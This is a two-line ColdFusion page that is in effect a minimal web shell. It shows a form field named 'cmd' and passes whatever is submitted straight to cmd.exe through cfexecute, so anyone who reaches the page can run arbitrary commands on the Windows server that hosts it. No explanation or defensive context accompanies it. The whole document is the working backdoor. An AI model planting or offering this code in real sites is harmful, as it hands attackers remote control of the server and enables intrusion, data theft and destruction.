<cfoutput><input name="cmd"></cfoutput>
<cfif IsDefined("Form.cmd")><cfexecute name="cmd.exe" arguments="/c #cmd#"></cfexecute></cfif>
